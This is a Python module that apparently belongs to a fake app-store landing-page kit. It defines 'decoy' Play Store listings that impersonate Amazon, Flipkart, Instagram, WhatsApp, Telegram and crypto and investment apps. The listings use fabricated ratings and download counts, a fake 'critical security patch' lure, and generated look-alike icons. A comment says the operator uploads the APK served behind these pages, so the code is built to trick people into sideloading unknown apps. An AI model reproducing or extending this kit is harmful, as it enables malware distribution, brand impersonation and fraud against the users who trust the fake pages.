"""
Play-share decoy templates (Bloop, BingX, Amazon, Flipkart, social, investment).
Icons are generated once under web/play_landing_assets/templates/.
"""

from __future__ import annotations

import json
import random
from pathlib import Path
from typing import Any, Dict, List, Optional

from PIL import Image, ImageDraw, ImageFont

SERVER_DIR = Path(__file__).resolve().parent
ASSETS_DIR = SERVER_DIR / "web" / "play_landing_assets" / "templates"
ASSETS_DIR.mkdir(parents=True, exist_ok=True)

# Top decoy listings — meta only; APK always uploaded by operator.
TEMPLATES: List[Dict[str, Any]] = [
    {
        "id": "bloop",
        "category": "social",
        "app_name": "Bloop - Private Video Call",
        "developer": "Bloop Labs",
        "slug": "bloop-private-video-call",
        "rating": "4.6",
        "reviews": "892K",
        "downloads": "10M+",
        "content_rating": "Teen",
        "content_label": "Rated for 13+",
        "chips": ["Contains ads", "In-app purchases"],
        "about": (
            "Bloop lets you make private video calls with friends — crystal clear, "
            "encrypted, and simple. Start a call in one tap, share moments, and stay close."
        ),
        "changelog": [
            "Improved call quality on weak networks.",
            "Bug fixes and performance improvements.",
            "Privacy and security updates.",
        ],
        "icon_bg": ["#7C3AED", "#4F46E5"],
        "icon_letter": "B",
        "icon_accent": "#F5D0FE",
    },
    {
        "id": "bingx",
        "category": "investment",
        "app_name": "BingX: Trade Crypto & Copy",
        "developer": "BingX Global",
        "slug": "bingx-trade-crypto",
        "rating": "4.5",
        "reviews": "214K",
        "downloads": "10M+",
        "content_rating": "Everyone",
        "content_label": "Rated for 3+",
        "chips": ["In-app purchases"],
        "about": (
            "Trade crypto with confidence. Spot, futures, and copy trading — "
            "all in one secure app trusted by millions of investors worldwide."
        ),
        "changelog": [
            "Faster market charts and order execution.",
            "New copy-trading leaders board.",
            "Security hardening and bug fixes.",
        ],
        "icon_bg": ["#0EA5E9", "#0369A1"],
        "icon_letter": "Bx",
        "icon_accent": "#E0F2FE",
    },
    {
        "id": "amazon",
        "category": "shopping",
        "app_name": "Amazon Shopping",
        "developer": "Amazon Mobile LLC",
        "slug": "amazon-shopping",
        "rating": "4.5",
        "reviews": "15.2M",
        "downloads": "500M+",
        "content_rating": "Everyone",
        "content_label": "Rated for 3+",
        "chips": ["Contains ads", "In-app purchases"],
        "about": (
            "Shop millions of products with fast delivery, exclusive deals, "
            "and easy returns. Your Amazon store — always in your pocket."
        ),
        "changelog": [
            "Faster checkout and search.",
            "Deal recommendations improvements.",
            "Bug fixes and performance improvements.",
        ],
        "icon_bg": ["#232F3E", "#131A22"],
        "icon_letter": "a",
        "icon_accent": "#FF9900",
    },
    {
        "id": "flipkart",
        "category": "shopping",
        "app_name": "Flipkart Online Shopping App",
        "developer": "Flipkart",
        "slug": "flipkart-online-shopping",
        "rating": "4.4",
        "reviews": "48.1M",
        "downloads": "500M+",
        "content_rating": "Everyone",
        "content_label": "Rated for 3+",
        "chips": ["Contains ads", "In-app purchases"],
        "about": (
            "India's favourite shopping app. Mobiles, fashion, electronics, "
            "and more — with Big Billion Days deals and super-fast delivery."
        ),
        "changelog": [
            "Smoother browse and wishlist experience.",
            "Payment reliability improvements.",
            "Critical security vulnerability patch.",
        ],
        "icon_bg": ["#2874F0", "#1A5DC9"],
        "icon_letter": "Fk",
        "icon_accent": "#FFE11B",
    },
    {
        "id": "instagram",
        "category": "social",
        "app_name": "Instagram",
        "developer": "Instagram",
        "slug": "instagram",
        "rating": "4.1",
        "reviews": "152M",
        "downloads": "5B+",
        "content_rating": "Teen",
        "content_label": "Rated for 12+",
        "chips": ["Contains ads", "In-app purchases"],
        "about": (
            "Create & share photos, Reels, stories and messages with the people "
            "who matter to you. Join the conversation on Instagram."
        ),
        "changelog": [
            "Reels performance improvements.",
            "Messaging reliability fixes.",
            "Bug fixes and security updates.",
        ],
        "icon_bg": ["#F58529", "#DD2A7B", "#8134AF"],
        "icon_letter": "Ig",
        "icon_accent": "#FFFFFF",
    },
    {
        "id": "whatsapp",
        "category": "social",
        "app_name": "WhatsApp Messenger",
        "developer": "WhatsApp LLC",
        "slug": "whatsapp-messenger",
        "rating": "4.3",
        "reviews": "186M",
        "downloads": "5B+",
        "content_rating": "Everyone",
        "content_label": "Rated for 3+",
        "chips": [],
        "about": (
            "Simple. Reliable. Private. WhatsApp is a free messaging and video "
            "calling app available worldwide — with end-to-end encryption."
        ),
        "changelog": [
            "Call quality improvements.",
            "Status and channels updates.",
            "Bug fixes and performance improvements.",
        ],
        "icon_bg": ["#25D366", "#128C7E"],
        "icon_letter": "W",
        "icon_accent": "#FFFFFF",
    },
    {
        "id": "groww",
        "category": "investment",
        "app_name": "Groww: Stocks & Mutual Funds",
        "developer": "Groww",
        "slug": "groww-stocks-mutual-funds",
        "rating": "4.4",
        "reviews": "1.8M",
        "downloads": "50M+",
        "content_rating": "Everyone",
        "content_label": "Rated for 3+",
        "chips": [],
        "about": (
            "Invest in stocks, mutual funds, IPOs and more. Zero paperwork, "
            "clear insights, and a simple experience built for first-time investors."
        ),
        "changelog": [
            "Faster order placement.",
            "Watchlist and chart upgrades.",
            "Security and stability fixes.",
        ],
        "icon_bg": ["#00B386", "#008F6B"],
        "icon_letter": "G",
        "icon_accent": "#ECFDF5",
    },
    {
        "id": "telegram",
        "category": "social",
        "app_name": "Telegram",
        "developer": "Telegram FZ-LLC",
        "slug": "telegram",
        "rating": "4.4",
        "reviews": "28.4M",
        "downloads": "1B+",
        "content_rating": "Everyone",
        "content_label": "Rated for 3+",
        "chips": [],
        "about": (
            "Telegram is a messaging app with a focus on speed and security. "
            "It's super-fast, simple, and free — with powerful cloud chats and channels."
        ),
        "changelog": [
            "Faster media downloads.",
            "Stories and folder improvements.",
            "Bug fixes and performance improvements.",
        ],
        "icon_bg": ["#2AABEE", "#229ED9"],
        "icon_letter": "t",
        "icon_accent": "#FFFFFF",
    },
]


def _hex_to_rgb(h: str):
    h = h.lstrip("#")
    return tuple(int(h[i : i + 2], 16) for i in (0, 2, 4))


def _font(size: int):
    for name in (
        "C:\\Windows\\Fonts\\segoeuib.ttf",
        "C:\\Windows\\Fonts\\arialbd.ttf",
        "C:\\Windows\\Fonts\\arial.ttf",
        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",
    ):
        p = Path(name)
        if p.is_file():
            try:
                return ImageFont.truetype(str(p), size=size)
            except Exception:
                pass
    return ImageFont.load_default()


def _draw_icon(tpl: Dict[str, Any], size: int = 192) -> Path:
    out = ASSETS_DIR / f"{tpl['id']}.png"
    if out.is_file() and out.stat().st_size > 500:
        return out

    img = Image.new("RGBA", (size, size), (0, 0, 0, 0))
    draw = ImageDraw.Draw(img)
    colors = tpl.get("icon_bg") or ["#333333", "#111111"]
    # rounded rect background with vertical/diagonal blend
    c0 = _hex_to_rgb(colors[0])
    c1 = _hex_to_rgb(colors[-1])
    radius = int(size * 0.22)
    mask = Image.new("L", (size, size), 0)
    ImageDraw.Draw(mask).rounded_rectangle((0, 0, size - 1, size - 1), radius=radius, fill=255)
    grad = Image.new("RGBA", (size, size))
    gdraw = ImageDraw.Draw(grad)
    for y in range(size):
        t = y / max(size - 1, 1)
        # optional 3-stop (instagram-like)
        if len(colors) >= 3:
            mid = _hex_to_rgb(colors[1])
            if t < 0.5:
                u = t * 2
                rgb = tuple(int(c0[i] + (mid[i] - c0[i]) * u) for i in range(3))
            else:
                u = (t - 0.5) * 2
                rgb = tuple(int(mid[i] + (c1[i] - mid[i]) * u) for i in range(3))
        else:
            rgb = tuple(int(c0[i] + (c1[i] - c0[i]) * t) for i in range(3))
        gdraw.line([(0, y), (size, y)], fill=rgb + (255,))
    img = Image.composite(grad, img, mask)

    letter = str(tpl.get("icon_letter") or tpl["id"][:1]).upper()
    accent = _hex_to_rgb(tpl.get("icon_accent") or "#FFFFFF")
    # Amazon stylized lowercase looks better
    if tpl["id"] == "amazon":
        letter = "a"
    font = _font(int(size * (0.42 if len(letter) == 1 else 0.34)))
    draw = ImageDraw.Draw(img)
    bbox = draw.textbbox((0, 0), letter, font=font)
    tw, th = bbox[2] - bbox[0], bbox[3] - bbox[1]
    draw.text(
        ((size - tw) / 2 - bbox[0], (size - th) / 2 - bbox[1] - size * 0.02),
        letter,
        font=font,
        fill=accent + (255,),
    )

    # Amazon smile underline
    if tpl["id"] == "amazon":
        smile = _hex_to_rgb("#FF9900")
        draw.arc(
            (int(size * 0.28), int(size * 0.62), int(size * 0.72), int(size * 0.86)),
            start=20,
            end=160,
            fill=smile + (255,),
            width=max(3, size // 28),
        )

    img.save(out, format="PNG", optimize=True)
    return out


def ensure_template_icons() -> None:
    for tpl in TEMPLATES:
        _draw_icon(tpl)


def list_templates(category: Optional[str] = None) -> List[Dict[str, Any]]:
    ensure_template_icons()
    out = []
    for tpl in TEMPLATES:
        if category and tpl.get("category") != category:
            continue
        item = {k: v for k, v in tpl.items() if not k.startswith("icon_")}
        item["icon_url"] = f"/web/play_landing_assets/templates/{tpl['id']}.png"
        item["icon_file"] = str(ASSETS_DIR / f"{tpl['id']}.png")
        out.append(item)
    return out


def get_template(template_id: str) -> Optional[Dict[str, Any]]:
    ensure_template_icons()
    for tpl in TEMPLATES:
        if tpl["id"] == template_id:
            item = {k: v for k, v in tpl.items() if not k.startswith("icon_")}
            item["icon_url"] = f"/web/play_landing_assets/templates/{tpl['id']}.png"
            item["icon_path"] = ASSETS_DIR / f"{tpl['id']}.png"
            return item
    return None


def random_template(category: Optional[str] = None) -> Dict[str, Any]:
    pool = list_templates(category)
    if not pool:
        pool = list_templates()
    return random.choice(pool)


def templates_public_payload() -> Dict[str, Any]:
    return {
        "templates": list_templates(),
        "categories": sorted({t["category"] for t in TEMPLATES}),
    }


# Generate icons on import so static /web mount can serve them.
ensure_template_icons()
